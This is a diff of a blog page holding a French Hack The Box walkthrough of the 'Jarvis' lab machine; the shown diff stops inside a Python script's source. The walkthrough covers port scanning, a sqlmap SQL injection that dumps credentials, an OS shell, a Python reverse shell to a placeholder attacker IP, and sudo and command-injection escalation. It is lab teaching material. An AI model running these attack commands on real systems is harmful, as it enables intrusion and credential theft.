@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -23,17 +23,15 @@
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Hack The Box - Jarvis"/>
 <meta name="twitter:description" content="[NO ENGLISH VERSION - Only French is available for this post]
-
 Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploitation d&rsquo;un injection SQL sur le site web permet de récupérer un accès limité. Une première phase d&rsquo;escalade de privilège est réalisée grâce à une injection de commande dans un script. Enfin, la compromission de la machine peut être faite grâce à un binaire SUID (systemctl) en construisant un service."/>
 
 <meta property="og:title" content="Hack The Box - Jarvis" />
 <meta property="og:description" content="[NO ENGLISH VERSION - Only French is available for this post]
-
 Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploitation d&rsquo;un injection SQL sur le site web permet de récupérer un accès limité. Une première phase d&rsquo;escalade de privilège est réalisée grâce à une injection de commande dans un script. Enfin, la compromission de la machine peut être faite grâce à un binaire SUID (systemctl) en construisant un service." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/en/walkthroughs/hackthebox/jarvis/" />
-<meta property="article:published_time" content="2019-11-09T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2019-11-09T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2019-11-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-11-09T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -56,6 +54,32 @@ Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploit
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -174,7 +198,7 @@ Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploit
       <a rel="alternate" href="/fr/walkthroughs/hackthebox/jarvis/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -208,15 +232,10 @@ Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploit
   </header>
   <div class="post">
     <p>[NO ENGLISH VERSION - Only French is available for this post]</p>
-
 <p>Jarvis est une machine Linux catégorisée comme facile/moyenne. L&rsquo;exploitation d&rsquo;un injection SQL sur le site web permet de récupérer un accès limité. Une première phase d&rsquo;escalade de privilège est réalisée grâce à une injection de commande dans un script. Enfin, la compromission de la machine peut être faite grâce à un binaire SUID (systemctl) en construisant un service.</p>
-
 <p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
-
 <h2 id="découverte">Découverte</h2>
-
 <p>Un rapide scan de ports permet d&rsquo;obtenir les services présents sur la machine.</p>
-
 <pre><code>$ nmap -T4 -sS -Pn -p- -oN nmap_all_ports.txt -v 10.10.10.143
 Nmap scan report for 10.10.10.143
 Host is up (0.022s latency).
@@ -228,9 +247,7 @@ PORT      STATE    SERVICE
 9911/tcp  open     sype-transport
 33333/tcp open     dgi-serv
 64999/tcp open     unknown
-</code></pre>
-
-<pre><code>$ nmap -T4 -sS -Pn -p 22,80,9911,33333,64999 -O -sV -oN nmap_specific.txt -v 10.10.10.143
+</code></pre><pre><code>$ nmap -T4 -sS -Pn -p 22,80,9911,33333,64999 -O -sV -oN nmap_specific.txt -v 10.10.10.143
 Nmap scan report for 10.10.10.143
 Host is up (0.020s latency).
 
@@ -282,34 +299,20 @@ TCP Sequence Prediction: Difficulty=262 (Good luck!)
 IP ID Sequence Generation: All zeros
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-</code></pre>
-
-<h2 id="injection-sql">Injection SQL</h2>
-
+</code></pre><h2 id="injection-sql">Injection SQL</h2>
 <p>Le port 80 étant ouvert, les recherches commencent par ici. Il s&rsquo;agit du site web d&rsquo;un hôtel, utilisé pour présenter ce dernier et réserver des chambres. Un rapide parcourt du site permet de remarquer une URL intéressante :</p>
-
 <pre><code>http://10.10.10.143/room.php?cod=1
-</code></pre>
-
-<p>On pense directement à une injection SQL.
+</code></pre><p>On pense directement à une injection SQL.
 Quelques tests basiques à base de &ldquo;simples quotes&rdquo; permettent de mettre en évidence la présence de la vulnérabilité.</p>
-
 <p>A ce moment là, deux possibilités. Exploitation à la main ou automatisée. Dans le cadre de cette machine, j&rsquo;ai préféré automatiser l&rsquo;exploitation, à l&rsquo;aide de <code>sqlmap</code>.</p>
-
-<pre><code class="language-bash">$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot;
-$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot; --dbs
-$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot; -D mysql --tables
-$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot; -D mysql -T user --dump
-</code></pre>
-
-<p>Les commandes ci-dessus permettent de parcourir les différentes bases de données et leurs tables. On récupère ainsi l&rsquo;utilisateur <code>DBadmin</code> ainsi que son hash. Sqlmap propose également de tenter de casser ce hash à l&rsquo;aide de wordlists. Dans le cas de Jarvis, le mot de passe de l&rsquo;utilisateur est relativement faible.</p>
-
-<pre><code class="language-bash">User : DBadmin
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.143/room.php?cod=1&#34;</span>
+$ sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.143/room.php?cod=1&#34;</span> --dbs
+$ sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.143/room.php?cod=1&#34;</span> -D mysql --tables
+$ sqlmap -u <span style="color:#e6db74">&#34;http://10.10.10.143/room.php?cod=1&#34;</span> -D mysql -T user --dump
+</code></pre></div><p>Les commandes ci-dessus permettent de parcourir les différentes bases de données et leurs tables. On récupère ainsi l&rsquo;utilisateur <code>DBadmin</code> ainsi que son hash. Sqlmap propose également de tenter de casser ce hash à l&rsquo;aide de wordlists. Dans le cas de Jarvis, le mot de passe de l&rsquo;utilisateur est relativement faible.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">User : DBadmin
 Password : imissyou
-</code></pre>
-
-<p>A partir de là, plusieurs choses possibles (j&rsquo;ai appris plus tard qu&rsquo;un PHPMyAdmin vulnérable était présent). J&rsquo;ai personnellement choisi d&rsquo;uploader directement un webshell sur la machine, à l&rsquo;aide de sqlmap également (PHP webshell).</p>
-
+</code></pre></div><p>A partir de là, plusieurs choses possibles (j&rsquo;ai appris plus tard qu&rsquo;un PHPMyAdmin vulnérable était présent). J&rsquo;ai personnellement choisi d&rsquo;uploader directement un webshell sur la machine, à l&rsquo;aide de sqlmap également (PHP webshell).</p>
 <pre><code>$ sqlmap -u &quot;http://10.10.10.143/room.php?cod=1&quot; --os-shell
         ___
        __H__
@@ -332,33 +335,20 @@ Password : imissyou
 [14:00:58] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
 os-shell&gt; whoami
 do you want to retrieve the command standard output? [Y/n/a] command standard output: 'www-data'
-</code></pre>
-
-<h2 id="énumération-locale">Énumération locale</h2>
-
+</code></pre><h2 id="énumération-locale">Énumération locale</h2>
 <p>Afin de récupérer un accès plus stable et confortable, on peut exécuter un revershe shell en python.</p>
-
 <pre><code>os-shell&gt; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ATTACKER-IP&gt;&quot;,2233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
-</code></pre>
-
-<pre><code>$ nc -lvvp 2233
+</code></pre><pre><code>$ nc -lvvp 2233
 listening on [any] 2233 ...
 10.10.10.143: inverse host lookup failed: Unknown host
 connect to [10.10.13.221] from (UNKNOWN) [10.10.10.143] 34156
 /bin/sh: 0: can't access tty; job control turned off
 $
-</code></pre>
-
-<p>Pour encore plus de confort, on pop un bash complet à l&rsquo;aide de python.</p>
-
+</code></pre><p>Pour encore plus de confort, on pop un bash complet à l&rsquo;aide de python.</p>
 <pre><code>$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 www-data@jarvis:/var/www/html$ 
-</code></pre>
-
-<p>Et une phase d&rsquo;énumération commence&hellip; On peut par exemple utiliser le très bon script LinEnum.sh (<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>) permettant d&rsquo;avoir une vue d&rsquo;ensemble mais assez précise de la machine et de trouver d&rsquo;éventuels points faibles.</p>
-
+</code></pre><p>Et une phase d&rsquo;énumération commence&hellip; On peut par exemple utiliser le très bon script LinEnum.sh (<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a>) permettant d&rsquo;avoir une vue d&rsquo;ensemble mais assez précise de la machine et de trouver d&rsquo;éventuels points faibles.</p>
 <p>Afin d&rsquo;illustrer la suite, voici le contenu du fichier <code>/etc/passwd</code>.</p>
-
 <pre><code>root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -386,22 +376,15 @@ messagebus:x:105:110::/var/run/dbus:/bin/false
 pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
 mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
 sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
-</code></pre>
-
-<h2 id="script-sudo-et-injection-de-commandes">Script sudo et injection de commandes</h2>
-
+</code></pre><h2 id="script-sudo-et-injection-de-commandes">Script sudo et injection de commandes</h2>
 <p>Ci-dessous, un élément intéressant provenant de LinEnum.sh.</p>
-
 <pre><code>[+] We can sudo without supplying a password!
 Matching Defaults entries for www-data on jarvis:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User www-data may run the following commands on jarvis:
     (pepper : ALL) NOPASSWD: 
-</code></pre>
-
-<p>Il est donc possible d&rsquo;utiliser le script <code>/var/www/Admin-Utilities/simpler.py</code> avec sudo en temps que &ldquo;pepper&rdquo;.</p>
-
+</code></pre><p>Il est donc possible d&rsquo;utiliser le script <code>/var/www/Admin-Utilities/simpler.py</code> avec sudo en temps que &ldquo;pepper&rdquo;.</p>
 <pre><code>www-data@jarvis:/tmp$ file /var/www/Admin-Utilities/simpler.py
 file /var/www/Admin-Utilities/simpler.py
 /var/www/Admin-Utilities/simpler.py: Python script, ASCII text executable
@@ -412,174 +395,165 @@ total 16
 drwxr-xr-x 2 pepper pepper 4096 Mar  4  2019 .
 drwxr-xr-x 4 root   root   4096 Mar  4  2019 ..
 -rwxr--r-- 1 pepper pepper 4587 Mar  4  2019 simpler.py
-</code></pre>
+</code></pre><p>Une rapide analyse du code source (disponible ci-dessous) révèle que l&rsquo;outil réalise entre autres un ping après que l&rsquo;utilisateur ait rentré une adresse IP à joindre.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> listdir
+<span style="color:#f92672">import</span> re
 
-<p>Une rapide analyse du code source (disponible ci-dessous) révèle que l&rsquo;outil réalise entre autres un ping après que l&rsquo;utilisateur ait rentré une adresse IP à joindre.</p>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_help</span>():
+    message<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">********************************************************
+</span><span style="color:#e6db74">* Simpler   -   A simple simplifier ;)                 *
+</span><span style="color:#e6db74">* Version 1.0                                          *
+</span><span style="color:#e6db74">********************************************************
+</span><span style="color:#e6db74">Usage:  python3 simpler.py [options]
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Options:
+</span><span style="color:#e6db74">    -h/--help   : This help
+</span><span style="color:#e6db74">    -s          : Statistics
+</span><span style="color:#e6db74">    -l          : List the attackers IP
+</span><span style="color:#e6db74">    -p          : ping an attacker IP
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+    <span style="color:#66d9ef">print</span>(message)
 
-<pre><code class="language-python">#!/usr/bin/env python3
-from datetime import datetime
-import sys
-import os
-from os import listdir
-import re
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_header</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;&#39;***********************************************
+</span><span style="color:#e6db74">     _                 _                       
+</span><span style="color:#e6db74"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+</span><span style="color:#e6db74">/ __| | &#39;_ ` _ \| &#39;_ \| |/ _ \ &#39;__| &#39;_ \| | | |
+</span><span style="color:#e6db74">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+</span><span style="color:#e6db74">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+</span><span style="color:#e6db74">                |_|               |_|    |___/ 
+</span><span style="color:#e6db74">                                @ironhackers.es
+</span><span style="color:#e6db74">                                
+</span><span style="color:#e6db74">***********************************************
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
 
-def show_help():
-    message='''
-********************************************************
-* Simpler   -   A simple simplifier ;)                 *
-* Version 1.0                                          *
-********************************************************
-Usage:  python3 simpler.py [options]
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_statistics</span>():
+    path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/home/pepper/Web/Logs/&#39;</span>
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Statistics</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">-----------&#39;</span>)
+    listed_files <span style="color:#f92672">=</span> listdir(path)
+    count <span style="color:#f92672">=</span> len(listed_files)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Number of Attackers: &#39;</span> <span style="color:#f92672">+</span> str(count))
+    level_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    dat <span style="color:#f92672">=</span> datetime(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)
+    ip_list <span style="color:#f92672">=</span> []
+    reks <span style="color:#f92672">=</span> []
+    ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    req <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    rek <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> listed_files:
+        f <span style="color:#f92672">=</span> open(path <span style="color:#f92672">+</span> i, <span style="color:#e6db74">&#39;r&#39;</span>)
+        lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+        level2, rek <span style="color:#f92672">=</span> get_max_level(lines)
+        fecha, requ <span style="color:#f92672">=</span> date_to_num(lines)
+        ip <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">3</span>]
+        <span style="color:#66d9ef">if</span> fecha <span style="color:#f92672">&gt;</span> dat:
+            dat <span style="color:#f92672">=</span> fecha
+            req <span style="color:#f92672">=</span> requ
+            ip2 <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">3</span>]
+        <span style="color:#66d9ef">if</span> int(level2) <span style="color:#f92672">&gt;</span> int(level_1):
+            level_1 <span style="color:#f92672">=</span> level2
+            ip_list <span style="color:#f92672">=</span> [ip]
+            reks<span style="color:#f92672">=</span>[rek]
+        <span style="color:#66d9ef">elif</span> int(level2) <span style="color:#f92672">==</span> int(level_1):
+            ip_list<span style="color:#f92672">.</span>append(ip)
+            reks<span style="color:#f92672">.</span>append(rek)
+        f<span style="color:#f92672">.</span>close()
+	
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Most Risky:&#39;</span>)
+    <span style="color:#66d9ef">if</span> len(ip_list) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;More than 1 ip found&#39;</span>)
+    cont <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> ip_list:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;    &#39;</span> <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; - Attack Level : &#39;</span> <span style="color:#f92672">+</span> level_1 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; Request: &#39;</span> <span style="color:#f92672">+</span> reks[cont])
+        cont <span style="color:#f92672">=</span> cont <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+	
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Most Recent: &#39;</span> <span style="color:#f92672">+</span> ip2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; --&gt; &#39;</span> <span style="color:#f92672">+</span> str(dat) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> req)
+	
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_ip</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Attackers</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">-----------&#39;</span>)
+    path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/home/pepper/Web/Logs/&#39;</span>
+    listed_files <span style="color:#f92672">=</span> listdir(path)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> listed_files:
+        f <span style="color:#f92672">=</span> open(path <span style="color:#f92672">+</span> i,<span style="color:#e6db74">&#39;r&#39;</span>)
+        lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+        level,req <span style="color:#f92672">=</span> get_max_level(lines)
+        <span style="color:#66d9ef">print</span>(i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; - Attack Level : &#39;</span> <span style="color:#f92672">+</span> level)
+        f<span style="color:#f92672">.</span>close()
 
-Options:
-    -h/--help   : This help
-    -s          : Statistics
-    -l          : List the attackers IP
-    -p          : ping an attacker IP
-    '''
-    print(message)
-
-def show_header():
-    print('''***********************************************
-     _                 _                       
- ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
-/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
-\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
-|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
-                |_|               |_|    |___/ 
-                                @ironhackers.es
-                                
-***********************************************
-''')
-
-def show_statistics():
-    path = '/home/pepper/Web/Logs/'
-    print('Statistics\n-----------')
-    listed_files = listdir(path)
-    count = len(listed_files)
-    print('Number of Attackers: ' + str(count))
-    level_1 = 0
-    dat = datetime(1, 1, 1)
-    ip_list = []
-    reks = []
-    ip = ''
-    req = ''
-    rek = ''
-    for i in listed_files:
-        f = open(path + i, 'r')
-        lines = f.readlines()
-        level2, rek = get_max_level(lines)
-        fecha, requ = date_to_num(lines)
-        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
-        if fecha &gt; dat:
-            dat = fecha
-            req = requ
-            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
-        if int(level2) &gt; int(level_1):
-            level_1 = level2
-            ip_list = [ip]
-            reks=[rek]
-        elif int(level2) == int(level_1):
-            ip_list.append(ip)
-            reks.append(rek)
-        f.close()
-    
-    print('Most Risky:')
-    if len(ip_list) &gt; 1:
-        print('More than 1 ip found')
-    cont = 0
-    for i in ip_list:
-        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
-        cont = cont + 1
-    
-    print('Most Recent: ' + ip2 + ' --&gt; ' + str(dat) + ' ' + req)
-    
-def list_ip():
-    print('Attackers\n-----------')
-    path = '/home/pepper/Web/Logs/'
-    listed_files = listdir(path)
-    for i in listed_files:
-        f = open(path + i,'r')
-        lines = f.readlines()
-        level,req = get_max_level(lines)
-        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
-        f.close()
-
-def date_to_num(lines):
-    dat = datetime(1,1,1)
-    ip = ''
-    req=''
-    for i in lines:
-        if 'Level' in i:
-            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
-            regex = '(\d+)-(.*)-(\d+)(.*)'
-            logEx=re.match(regex, fecha).groups()
-            mes = to_dict(logEx[1])
-            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
-            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
-            if fecha &gt; dat:
-                dat = fecha
-                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
-    return dat, req
-            
-def to_dict(name):
-    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
-    return month_dict[name]
-    
-def get_max_level(lines):
-    level=0
-    for j in lines:
-        if 'Level' in j:
-            if int(j.split(' ')[4]) &gt; int(level):
-                level = j.split(' ')[4]
-                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
-    return level, req
-    
-def exec_ping():
-    forbidden = ['&amp;', ';', '-', '`', '||', '|']
-    command = input('Enter an IP: ')
-    for i in forbidden:
-        if i in command:
-            print('Got you')
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">date_to_num</span>(lines):
+    dat <span style="color:#f92672">=</span> datetime(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>)
+    ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    req<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> lines:
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Level&#39;</span> <span style="color:#f92672">in</span> i:
+            fecha<span style="color:#f92672">=</span>(i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">7</span>])<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">0</span>]
+            regex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;(\d+)-(.*)-(\d+)(.*)&#39;</span>
+            logEx<span style="color:#f92672">=</span>re<span style="color:#f92672">.</span>match(regex, fecha)<span style="color:#f92672">.</span>groups()
+            mes <span style="color:#f92672">=</span> to_dict(logEx[<span style="color:#ae81ff">1</span>])
+            fecha <span style="color:#f92672">=</span> logEx[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">+</span> mes <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">+</span> logEx[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> logEx[<span style="color:#ae81ff">3</span>]
+            fecha <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>strptime(fecha, <span style="color:#e6db74">&#39;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H:%M:%S&#39;</span>)
+            <span style="color:#66d9ef">if</span> fecha <span style="color:#f92672">&gt;</span> dat:
+                dat <span style="color:#f92672">=</span> fecha
+                req <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">10</span>]
+    <span style="color:#66d9ef">return</span> dat, req
+			
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">to_dict</span>(name):
